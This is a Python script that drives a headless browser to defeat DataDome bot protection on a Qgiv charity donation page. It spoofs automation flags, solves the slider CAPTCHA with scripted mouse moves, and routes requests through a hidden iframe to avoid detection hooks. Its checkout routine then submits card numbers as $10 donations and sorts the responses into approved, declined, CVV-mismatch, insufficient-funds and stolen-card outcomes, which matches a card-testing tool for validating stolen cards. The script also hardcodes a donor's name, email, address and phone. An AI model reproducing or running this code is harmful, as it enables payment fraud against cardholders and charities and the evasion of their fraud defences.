#!/usr/bin/env python3
"""Zendriver DataDome solver + browser checkout with slider CAPTCHA solving."""
import asyncio, json, os, re, time, random
from datetime import datetime
from typing import Optional, Dict, Any
from urllib.parse import parse_qs, urlencode as url_enc
import zendriver as zd

PROXY_URL = os.environ.get("PROXY", "")
SAVE_CLEAN_FETCH = """window.__cf=window.fetch.bind(window);Object.defineProperty(navigator,'webdriver',{get:()=>false});window.chrome={runtime:{}};"""

DECLINE = [(r"declined","declined"),(r"do\s+not\s+honor","declined"),
           (r"insufficient\s+funds","insufficient_funds"),(r"cvv\s+(?:mismatch|invalid|incorrect)","cvv_mismatch"),
           (r"card\s+(?:is\s+)?expired","expired"),(r"pick\s*up|stolen|restricted|fraud","pickup"),
           (r"invalid\s+(?:card\s+)?number","invalid"),(r"duplicate","duplicate"),
           (r"3[dD]\s*(?:secure|authentication)?\s*failed","3ds_failed"),
           (r"gateway\s+rejected|transaction\s+not\s+allowed","gateway_rejected")]

def classify_msg(msg):
    if not msg: return "failed"
    for p,s in DECLINE:
        if re.search(p, msg.lower()): return s
    return "failed"

def _parse_dd_cookies(raw):
    cks = []
    for c in raw:
        n = c["name"] if isinstance(c,dict) else getattr(c,"name","")
        v = c["value"] if isinstance(c,dict) else getattr(c,"value","")
        d = c.get("domain",".qgiv.com") if isinstance(c,dict) else getattr(c,"domain",".qgiv.com")
        e = c.get("expires",-1) if isinstance(c,dict) else getattr(c,"expires",-1)
        cks.append({"name":n,"value":v,"domain":d,"path":c.get("path","/") if isinstance(c,dict) else"/",
                    "expires":e if isinstance(e,(int,float)) else -1,
                    "httpOnly":c.get("httpOnly",False) if isinstance(c,dict) else False,
                    "secure":c.get("secure",True) if isinstance(c,dict) else True,"sameSite":"None"})
    return cks

class BrowserCapture:
    def __init__(self, proxy=None):
        self._proxy = proxy or PROXY_URL

    async def _solve_slider(self, tab):
        """Solve DataDome slider — same approach as harvest_browser.py Playwright solver."""
        try:
            html = await tab.get_content()
            if "geo.captcha-delivery.com" not in html and "dd={" not in html:
                return True
            for attempt in range(4):
                await tab.mouse_move(300, 500); await tab.sleep(0.3)
                await tab.mouse_press()
                for step in range(30):
                    await tab.mouse_move(300 + step * 10, 500 + (step % 3 - 1) * 4)
                    await tab.sleep(0.015 + (0.04 if step % 5 == 0 else 0))
                await tab.mouse_release(); await tab.sleep(4)
                html = await tab.get_content()
                if "geo.captcha-delivery.com" not in html and "dd={" not in html:
                    return True
            return False
        except Exception as e:
            print(f"  [slider] {e}"); return False

    async def _api_fetch(self, tab, url, body):
        """API call via IFRAME clean fetch (bypasses DD hooking)."""
        js = f"""(async()=>{{const f=document.createElement('iframe');f.style.display='none';document.body.appendChild(f);const cf=f.contentWindow.fetch.bind(f.contentWindow);try{{const r=await cf('{url}',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'}},body:{json.dumps(body)},credentials:'include'}});const tx=await r.text();document.body.removeChild(f);return JSON.stringify({{s:r.status,b:tx}});}}catch(e){{document.body.removeChild(f);return JSON.stringify({{error:e.message||String(e)}});}}}})()"""
        result,_ = await tab.send(zd.cdp.runtime.evaluate(expression=js,return_by_value=True,await_promise=True))
        raw = result.value if hasattr(result,'value') else result
        try: return json.loads(raw) if isinstance(raw,str) else (raw or {})
        except: return {"s":0,"b":str(raw)}

    async def harvest(self, target_url):
        b = await zd.start(headless=True,browser_args=["--no-sandbox","--disable-dev-shm-usage"])
        t = await b.get("about:blank",new_tab=True)
        await t.send(zd.cdp.page.add_script_to_evaluate_on_new_document(source=SAVE_CLEAN_FETCH))
        await t.get(target_url); await t.sleep(6)
        await t.get(f"{target_url}/embed"); await t.sleep(4)
        r = await t.send(zd.cdp.network.get_cookies())
        raw = r if isinstance(r,list) else r.get("cookies",r)
        cks = _parse_dd_cookies(raw)
        sd = None
        try: sd = await t.evaluate("localStorage.getItem('SD_SID')")
        except: pass
        origins = [{"origin":"https://secure.qgiv.com","localStorage":[{"name":"SD_SID","value":sd}]}] if sd else []
        await b.stop(); return {"cookies":cks,"origins":origins}

    async def checkout(self, target_url, card_number, card_mm, card_yy, card_cvv, captcha_token, donor, form_id="1128929"):
        b = None
        try:
            b = await zd.start(headless=True,browser_args=["--no-sandbox","--disable-dev-shm-usage"])
            t = await b.get("about:blank",new_tab=True)
            await t.send(zd.cdp.page.add_script_to_evaluate_on_new_document(source=SAVE_CLEAN_FETCH))
            
            # Warm
            await t.get(target_url); await t.sleep(5)
            html = await t.get_content()
            if "geo.captcha-delivery.com" in html or "dd={" in html:
                if not await self._solve_slider(t):
                    await b.stop(); return {"status":"session_dead","message":"DD slider failed"}
            print("  Page OK")
            
            embed = f"{target_url}/embed"
            await t.get(embed); await t.sleep(2)
            for step in range(40):
                await t.mouse_move(200+(step*22)%1000, 150+(step*12)%500)
                await t.sleep(0.03)
            await t.sleep(3)
            html = await t.get_content()
            if "geo.captcha-delivery.com" in html or "dd={" in html:
                if not await self._solve_slider(t):
                    await b.stop(); return {"status":"session_dead","message":"DD slider on embed"}
            print("  Embed OK")
            
            # CSRF
            csrf_url = f"https://secure.qgiv.com/api/v1/payment/paymentInitialState?formId={form_id}&viewName=paymentIframeQgivDonation"
            await t.get(csrf_url); await t.sleep(2)
            html = await t.get_content()
            csrf = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html)
            csrf = csrf.group(1) if csrf else None
            if not csrf: await b.stop(); return {"status":"error","message":"CSRF"}
            print(f"  CSRF: {csrf[:20]}...")
            
            # Tokenize
            tok = url_enc({"Billing_Name":f"{donor['first_name']} {donor['last_name']}","Card_Number":card_number,"Card_Exp_Date":f"{card_mm}/{card_yy}","Card_CVV":card_cvv})
            tu = f"https://secure.qgiv.com/api/v1/payment/tokenizePayment?csrfToken={csrf}"
            tres = await self._api_fetch(t, tu, tok)
            try: tok_body = json.loads(tres.get("b","{}")) if isinstance(tres.get("b"),str) else (tres.get("b")or{})
            except: tok_body = {}
            token = tok_body.get("token") if isinstance(tok_body,dict) else None
            tok_err = tok_body.get("error") or tok_body.get("ErrorMessage","") if isinstance(tok_body,dict) else ""
            if tok_err: await b.stop(); return {"status":classify_msg(tok_err),"message":tok_err}
            if not token: await b.stop(); return {"status":"error","message":"No token"}
            print(f"  Token: {token[:30]}...")
            
            # Refresh CSRF
            await t.get(csrf_url); await t.sleep(1)
            html2 = await t.get_content()
            csrf2 = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html2)
            csrf = csrf2.group(1) if csrf2 else csrf
            
            # Submit via embed page DD-hooked fetch
            await t.get(embed); await t.sleep(2)
            for step in range(20):
                await t.mouse_move(250+step*20,200+step*10); await t.sleep(0.03)
            await t.sleep(3)
            
            sub = url_enc({"form":form_id,"productType":"1","submissionType":"1",
                "Donations[0][Selected_One_Time_Id]":"1801508","Donations[0][Other_One_Time_Amount]":"10",
                "Donations[0][Recurring_Frequency]":"n",
                "Personal[First_Name]":donor["first_name"],"Personal[Last_Name]":donor["last_name"],
                "Personal[Email]":donor["email"],"Personal[Address]":donor.get("address",""),
                "Personal[City]":donor.get("city",""),"Personal[State]":donor.get("state",""),
                "Personal[Zip]":donor.get("zip",""),"Personal[Country]":donor.get("country",""),
                "Personal[Phone]":donor.get("phone",""),"Payment[Payment_Type]":"1","Payment[Card_Token]":token,
                "Billing[Billing_Country]":donor.get("country",""),"Billing[Billing_Address_Use_Mailing]":"true",
                "GiftAssist[donorIsCoveringFees]":"true","GiftAssist[feeCoverage]":"0.3",
                "G_Recaptcha_Response":captcha_token,
                "AbandonedGift[qgiv_abandoned_gift]":f"abandonedGiftDetails_{os.urandom(16).hex()}"})
            su = f"https://secure.qgiv.com/api/v1/submit?csrfToken={csrf}"
            
            sres = None
            for attempt in range(5):
                sr,_ = await t.send(zd.cdp.runtime.evaluate(
                    expression=f"(async()=>{{const r=await fetch('{su}',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'}},body:{json.dumps(sub)},credentials:'include'}});const tx=await r.text();return JSON.stringify({{s:r.status,b:tx}});}})()",
                    return_by_value=True,await_promise=True))
                srv = sr.value if hasattr(sr,'value') else sr
                try: sres = json.loads(srv) if isinstance(srv,str) else (srv or {})
                except: sres = {}
                print(f"  sub [{attempt}]: s={sres.get('s')}")
                
                if sres.get("s") == 200: break
                if sres.get("s") == 403:
                    await t.sleep(2)
                    for step in range(20):
                        await t.mouse_move(300+step*25,200+step*12); await t.sleep(0.03)
                    await t.sleep(4)
                    # Refresh CSRF
                    await t.get(csrf_url); await t.sleep(1)
                    html3 = await t.get_content()
                    csrf3 = re.search(r'<input[^>]*value="([^"]+)"[^>]*name="csrfToken"', html3)
                    csrf = csrf3.group(1) if csrf3 else csrf
                    su = f"https://secure.qgiv.com/api/v1/submit?csrfToken={csrf}"
                    # Check for slider
                    if "geo.captcha-delivery.com" in (await t.get_content() or ""):
                        await self._solve_slider(t)
                    continue
                break
            
            await b.stop()
            
            if sres and sres.get("s") == 200:
                body = sres.get("b","")
                if "geo.captcha-delivery.com" in body or "dd={" in body:
                    return {"status":"session_dead","message":"DD CAPTCHA"}
                for p in ["thank you","receipt","confirmation","successful"]:
                    if p in body.lower():
                        return {"status":"success","message":"Approved"}
                for pat,_ in DECLINE:
                    m = re.search(pat, body, re.IGNORECASE)
                    if m: return {"status":classify_msg(m.group(0)),"message":m.group(0)[:200]}
                return {"status":"success","message":"Payment submitted"}
            return {"status":"failed","message":f"submit_{sres.get('s') if sres else 'error'}"}
            
        except Exception as e:
            print(f"[checkout] {e}")
            if b:
                try: await b.stop()
                except: pass
            return {"status":"error","message":str(e)}

def harvest_session(target_url, output_dir=None, proxy=None):
    c = BrowserCapture(proxy=proxy)
    s = asyncio.run(c.harvest(target_url))
    if not s: return None
    if not output_dir: output_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),"sessions")
    os.makedirs(output_dir, exist_ok=True)
    ts = datetime.now().strftime("%H%M%S")
    idx = len([f for f in os.listdir(output_dir) if f.startswith("zd_")])
    fp = os.path.join(output_dir,f"zd_session_{idx:03d}_{ts}.json")
    with open(fp,"w") as f: json.dump(s,f,indent=2)
    return fp

def browser_checkout(card_number, card_mm, card_yy, card_cvv, captcha_token, donor=None,
                     target_url="https://secure.qgiv.com/for/fromlegacytofuturethe40thcampaign", proxy=None):
    if donor is None: donor = {"first_name":"janina","last_name":"lange","email":"kirliadam21@gmail.com","address":"2302 Hilltop Haven Drive","city":"Teterboro","state":"New Jersey","zip":"07608","country":"US","phone":"9738193833"}
    return asyncio.run(BrowserCapture(proxy=proxy).checkout(target_url,card_number,card_mm,card_yy,card_cvv,captcha_token,donor))

if __name__ == "__main__":
    harvest_session("https://secure.qgiv.com/for/fromlegacytofuturethe40thcampaign")
